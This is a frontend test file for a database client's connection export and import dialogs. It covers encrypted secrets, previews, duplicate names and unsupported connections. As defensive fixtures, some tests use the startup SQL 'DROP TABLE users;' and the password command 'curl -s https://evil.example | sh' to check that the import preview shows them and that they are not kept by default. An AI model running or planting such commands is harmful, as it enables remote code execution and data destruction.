import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { render, screen, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { toast } from "sonner";
import { afterEach, beforeAll, beforeEach, describe, expect, it, vi } from "vitest";
import { ipc } from "@/lib/ipc";
import { resetMockConnectionFiles } from "@/lib/ipc/mock/connections_io";
import { SEED_PROFILES } from "@/lib/ipc/mock/fixtures";
import { resetMockSettings } from "@/lib/ipc/mock/settings";
import { ExportConnectionsDialog } from "./ExportConnectionsDialog";
import { ImportConnectionsDialog } from "./ImportConnectionsDialog";
import type { ExportScope } from "./ioStore";

vi.mock("sonner", () => ({
  toast: Object.assign(vi.fn(), { success: vi.fn(), error: vi.fn(), message: vi.fn() }),
}));

const SCOPE: ExportScope = {
  title: "Export “Staging”",
  profileIds: ["p-staging-ssh", "p-rotated-ssh"],
  groups: ["Staging"],
  fileName: "Staging",
};
const PATH = "/Users/me/Downloads/Staging.tablerconnections";

function wrap(ui: React.ReactNode) {
  const qc = new QueryClient({ defaultOptions: { queries: { retry: false } } });
  return render(<QueryClientProvider client={qc}>{ui}</QueryClientProvider>);
}

beforeAll(async () => {
  await import("@/lib/ipc/mock");
});
beforeEach(() => resetMockConnectionFiles());
afterEach(() => {
  vi.restoreAllMocks();
  vi.mocked(toast.success).mockReset();
});

describe("ExportConnectionsDialog", () => {
  it("needs a file password to include secrets, then saves where the user picks", async () => {
    const run = vi.spyOn(ipc.profiles, "exportConnections");
    const prompt = vi.spyOn(window, "prompt").mockReturnValue(PATH);
    const onClose = vi.fn();
    const user = userEvent.setup();
    wrap(<ExportConnectionsDialog scope={SCOPE} onClose={onClose} />);
    const dialog = await screen.findByRole("dialog", { name: "Export “Staging”" });
    expect(dialog).toHaveTextContent("2 connections");
    expect(within(dialog).getByLabelText("File password (optional)")).toBeInTheDocument();

    await user.click(within(dialog).getByRole("checkbox", { name: "Include database passwords" }));
    await user.click(within(dialog).getByRole("button", { name: "Export…" }));
    expect(within(dialog).getByRole("alert")).toHaveTextContent("Set a file password");
    expect(prompt).not.toHaveBeenCalled();

    await user.click(
      within(dialog).getByRole("checkbox", { name: "Include SSH passwords and passphrases" }),
    );
    await user.type(within(dialog).getByLabelText("File password"), "pw");
    await user.click(within(dialog).getByRole("button", { name: "Export…" }));
    await vi.waitFor(() => expect(onClose).toHaveBeenCalled());
    expect(prompt).toHaveBeenCalledWith(
      "Export connections to",
      "/Users/me/Downloads/Staging.tablerconnections",
    );
    expect(run).toHaveBeenCalledWith({
      profileIds: SCOPE.profileIds,
      groups: ["Staging"],
      includePasswords: true,
      includeSshSecrets: true,
      filePassword: "pw",
      path: PATH,
    });
    expect(toast.success).toHaveBeenCalledWith("Exported 2 connections", { description: PATH });
  });

  it("does nothing when the save panel is cancelled", async () => {
    const run = vi.spyOn(ipc.profiles, "exportConnections");
    vi.spyOn(window, "prompt").mockReturnValue(null);
    const onClose = vi.fn();
    const user = userEvent.setup();
    wrap(<ExportConnectionsDialog scope={SCOPE} onClose={onClose} />);
    const dialog = await screen.findByRole("dialog");
    await user.click(within(dialog).getByRole("button", { name: "Export…" }));
    expect(run).not.toHaveBeenCalled();
    expect(onClose).not.toHaveBeenCalled();
  });

  it("round-trips through the import dialog: password, preview and duplicate names", async () => {
    vi.spyOn(window, "prompt").mockReturnValue(PATH);
    const user = userEvent.setup();
    const { unmount } = wrap(<ExportConnectionsDialog scope={SCOPE} onClose={() => {}} />);
    const exporting = await screen.findByRole("dialog");
    await user.type(within(exporting).getByLabelText("File password (optional)"), "secret");
    await user.click(within(exporting).getByRole("button", { name: "Export…" }));
    await vi.waitFor(() => expect(toast.success).toHaveBeenCalled());
    unmount();

    const importConnections = vi.spyOn(ipc.profiles, "importConnections");
    const onImported = vi.fn();
    const onClose = vi.fn();
    wrap(<ImportConnectionsDialog path={PATH} onClose={onClose} onImported={onImported} />);
    const dialog = await screen.findByRole("dialog", { name: "Import Connections" });
    expect(dialog).toHaveTextContent("Staging.tablerconnections");
    const password = await within(dialog).findByLabelText("File password");
    await user.type(password, "wrong{Enter}");
    expect(await within(dialog).findByRole("alert")).toHaveTextContent("password is wrong");
    await user.clear(password);
    await user.type(password, "secret{Enter}");

    const items = await within(dialog).findByRole("list", { name: "Connections in the file" });
    expect(within(items).getAllByRole("listitem")).toHaveLength(2);
    // Both names exist already (they were exported from this list).
    expect(within(items).getAllByText(/already exists/)).toHaveLength(2);
    expect(within(dialog).getByText("2 connections selected")).toBeInTheDocument();
    await user.click(within(items).getByRole("checkbox", { name: "Import Rotated host" }));
    expect(within(dialog).getByText("1 connection selected")).toBeInTheDocument();
    await user.click(within(dialog).getByRole("button", { name: "Import" }));
    await vi.waitFor(() => expect(onClose).toHaveBeenCalled());
    expect(importConnections).toHaveBeenCalledWith(PATH, "secret", ["p-staging-ssh"], []);
    expect(onImported).toHaveBeenCalledWith([
      expect.objectContaining({ name: "Staging via SSH", group: "Staging" }),
    ]);
    expect(onImported.mock.calls[0]![0][0].id).not.toBe("p-staging-ssh");
  });

  it("shows each connection's safe-mode level, Read-only and startup SQL before importing", async () => {
    const pg = SEED_PROFILES.find((p) => p.id === "p-local-pg")!;
    const options = { ...pg.options, safeMode: null, readOnly: false, startupSql: null };
    const sneaky = {
      ...pg,
      id: "f-sneaky",
      name: "Sneaky",
      options: { ...options, safeMode: "alert" as const, startupSql: "DROP TABLE users;" },
    };
    const plain = { ...pg, id: "f-plain", name: "Plain", options: { ...options, readOnly: true } };
    vi.spyOn(ipc.profiles, "inspectConnectionsFile").mockResolvedValue({
      encrypted: false,
      needsPassword: false,
      groups: [],
      connections: [sneaky, plain].map((profile) => ({
        profile,
        duplicateName: false,
        hasPassword: false,
        hasSshSecrets: false,
      })),
      skipped: [],
    });
    const importConnections = vi.spyOn(ipc.profiles, "importConnections").mockResolvedValue([]);
    const user = userEvent.setup();
    wrap(<ImportConnectionsDialog path={PATH} onClose={() => {}} />);
    const items = await screen.findByRole("list", { name: "Connections in the file" });
    const [first, second] = within(items).getAllByRole("listitem");
    expect(first).toHaveTextContent("Alert Mode 1");
    expect(first).toHaveTextContent("Runs startup SQL on connect");
    expect(within(first!).getByLabelText("Startup SQL of Sneaky")).toHaveTextContent(
      "DROP TABLE users;",
    );
    expect(second).toHaveTextContent("Silent Mode");
    expect(second).toHaveTextContent("Read-only");
    expect(second).not.toHaveTextContent("startup SQL");
    // Only ticked connections come in.
    await user.click(within(items).getByRole("checkbox", { name: "Import Sneaky" }));
    await user.click(screen.getByRole("button", { name: "Import" }));
    await vi.waitFor(() =>
      expect(importConnections).toHaveBeenCalledWith(PATH, null, ["f-plain"], []),
    );
  });

  // Regression: a file could carry a password command (run through the shell on Connect / Test)
  // that the preview never showed and that was imported as is.
  it("shows each password command and imports it only when kept", async () => {
    const pg = SEED_PROFILES.find((p) => p.id === "p-local-pg")!;
    const iam = (id: string, name: string, command: string) => ({
      ...pg,
      id,
      name,
      options: { ...pg.options, passwordMode: "command" as const, passwordCommand: command },
    });
    vi.spyOn(ipc.profiles, "inspectConnectionsFile").mockResolvedValue({
      encrypted: false,
      needsPassword: false,
      groups: [],
      connections: [
        iam("f-rds", "RDS", "aws rds generate-db-auth-token --hostname db"),
        iam("f-evil", "Evil", "curl -s https://evil.example | sh"),
        { ...pg, id: "f-plain", name: "Plain" },
      ].map((profile) => ({
        profile,
        duplicateName: false,
        hasPassword: false,
        hasSshSecrets: false,
      })),
      skipped: [],
    });
    const importConnections = vi.spyOn(ipc.profiles, "importConnections").mockResolvedValue([]);
    const user = userEvent.setup();
    wrap(<ImportConnectionsDialog path={PATH} onClose={() => {}} />);
    const items = await screen.findByRole("list", { name: "Connections in the file" });
    const [rds, evil, plain] = within(items).getAllByRole("listitem");
    const evilCommand = within(evil!).getByRole("group", { name: "Password command of Evil" });
    expect(evilCommand).toHaveTextContent("curl -s https://evil.example | sh");
    expect(evilCommand).toHaveTextContent("asked on every connect");
    const keepEvil = within(evilCommand).getByRole("checkbox", {
      name: "Keep this password command",
    });
    expect(keepEvil).not.toBeChecked();
    expect(within(plain!).queryByRole("group", { name: /Password command/ })).toBeNull();
    // Kept for RDS only.
    await user.click(within(rds!).getByRole("checkbox", { name: "Keep this password command" }));
    expect(rds).not.toHaveTextContent("asked on every connect");
    await user.click(screen.getByRole("button", { name: "Import" }));
    await vi.waitFor(() =>
      expect(importConnections).toHaveBeenCalledWith(
        PATH,
        null,
        ["f-rds", "f-evil", "f-plain"],
        ["f-rds"],
      ),
    );
  });

  // A file a newer Tabler wrote can hold connections this version cannot read (a database it
  // does not support yet): they are listed apart, and the others still import.
  it("lists the connections it cannot read and imports the others", async () => {
    const pg = SEED_PROFILES.find((p) => p.id === "p-local-pg")!;
    vi.spyOn(ipc.profiles, "inspectConnectionsFile").mockResolvedValue({
      encrypted: false,
      needsPassword: false,
      groups: [],
      connections: [
        {
          profile: { ...pg, id: "f-plain", name: "Plain" },
          duplicateName: false,
          hasPassword: false,
          hasSshSecrets: false,
        },
      ],
      skipped: [
        {
          name: "Analytics",
          reason: "uses the futuredb driver, which this version of Tabler does not have",
        },
        { name: "", reason: "was saved by a newer version of Tabler (unknown variant)" },
      ],
    });
    const importConnections = vi.spyOn(ipc.profiles, "importConnections").mockResolvedValue([]);
    const user = userEvent.setup();
    wrap(<ImportConnectionsDialog path={PATH} onClose={() => {}} />);
    const items = await screen.findByRole("list", { name: "Connections in the file" });
    expect(within(items).getAllByRole("listitem")).toHaveLength(1);
    const skipped = screen.getByRole("group", { name: "Connections that cannot be imported" });
    expect(skipped).toHaveTextContent("2 connections need a newer version of Tabler");
    const [analytics, unnamed] = within(skipped).getAllByRole("listitem");
    expect(analytics).toHaveTextContent(
      "Analytics uses the futuredb driver, which this version of Tabler does not have",
    );
    expect(unnamed).toHaveTextContent("Unnamed connection was saved by a newer version");
    expect(screen.getByText("1 connection selected")).toBeInTheDocument();
    await user.click(screen.getByRole("button", { name: "Import" }));
    await vi.waitFor(() =>
      expect(importConnections).toHaveBeenCalledWith(PATH, null, ["f-plain"], []),
    );
  });

  it("says so when it can read none of the file's connections", async () => {
    vi.spyOn(ipc.profiles, "inspectConnectionsFile").mockResolvedValue({
      encrypted: false,
      needsPassword: false,
      groups: [],
      connections: [],
      skipped: [{ name: "Analytics", reason: "uses the futuredb driver" }],
    });
    wrap(<ImportConnectionsDialog path={PATH} onClose={() => {}} />);
    const skipped = await screen.findByRole("group", {
      name: "Connections that cannot be imported",
    });
    expect(skipped).toHaveTextContent("1 connection needs a newer version of Tabler");
    expect(screen.queryByText("The file has no connections.")).not.toBeInTheDocument();
    expect(screen.getByRole("button", { name: "Import" })).toBeDisabled();
  });

  it("exports password commands only with the passwords; the mock import drops unkept ones", async () => {
    const imported = await ipc.profiles.importConnections(
      "/Users/me/Downloads/team.tablerconnections",
      "tabler",
      ["f-warehouse"],
    );
    expect(imported[0]!.options.passwordCommand).toBeNull();
    expect(imported[0]!.options.passwordMode).toBe("ask");
    const kept = await ipc.profiles.importConnections(
      "/Users/me/Downloads/team.tablerconnections",
      "tabler",
      ["f-warehouse"],
      ["f-warehouse"],
    );
    expect(kept[0]!.options.passwordCommand).toContain("generate-db-auth-token");
    expect(kept[0]!.options.passwordMode).toBe("command");

    const out = "/Users/me/Downloads/iam.tablerconnections";
    const id = kept[0]!.id;
    await ipc.profiles.exportConnections({
      profileIds: [id],
      groups: [],
      includePasswords: false,
      includeSshSecrets: false,
      filePassword: null,
      path: out,
    });
    const plain = await ipc.profiles.inspectConnectionsFile(out);
    expect(plain.connections[0]!.profile.options.passwordCommand).toBeNull();
    expect(plain.connections[0]!.profile.options.passwordMode).toBe("ask");
    await ipc.profiles.exportConnections({
      profileIds: [id],
      groups: [],
      includePasswords: true,
      includeSshSecrets: false,
      filePassword: "pw",
      path: out,
    });
    const sealed = await ipc.profiles.inspectConnectionsFile(out, "pw");
    expect(sealed.connections[0]!.profile.options.passwordCommand).toContain(
      "generate-db-auth-token",
    );
  });

  it("carries nested groups with their icons; importing merges them by path", async () => {
    resetMockSettings();
    await ipc.settings.set("connectionGroups", [
      { path: "Staging", icon: "server" },
      { path: "Staging / Empty", icon: "archive" },
      { path: "Other", icon: "star" },
    ]);
    vi.spyOn(window, "prompt").mockReturnValue(PATH);
    const user = userEvent.setup();
    const scope = { ...SCOPE, groups: ["Staging", "Staging / Empty"] };
    const { unmount } = wrap(<ExportConnectionsDialog scope={scope} onClose={() => {}} />);
    const exporting = await screen.findByRole("dialog");
    await user.click(within(exporting).getByRole("button", { name: "Export…" }));
    await vi.waitFor(() => expect(toast.success).toHaveBeenCalled());
    unmount();

    // Elsewhere: the groups are still saved the old way (plain names), Staging without an icon.
    resetMockSettings();
    await ipc.settings.set("connectionGroups", ["Local", "Staging"]);
    const onClose = vi.fn();
    wrap(<ImportConnectionsDialog path={PATH} onClose={onClose} />);
    const items = await screen.findByRole("list", { name: "Connections in the file" });
    // The preview shows each connection's group path.
    expect(within(items).getAllByLabelText("Group Staging")).toHaveLength(2);
    await user.click(screen.getByRole("button", { name: "Import" }));
    await vi.waitFor(() => expect(onClose).toHaveBeenCalled());
    expect((await ipc.settings.get()).connectionGroups).toEqual([
      { path: "Local", icon: null },
      { path: "Staging", icon: "server" },
      { path: "Staging / Empty", icon: "archive" },
    ]);
  });

  it("explains a file that cannot be read", async () => {
    wrap(<ImportConnectionsDialog path="/nope.tablerconnections" onClose={() => {}} />);
    const dialog = await screen.findByRole("dialog", { name: "Import Connections" });
    expect(await within(dialog).findByRole("alert")).toHaveTextContent(/No such file/);
    expect(within(dialog).getByRole("button", { name: "Import" })).toBeDisabled();
  });
});
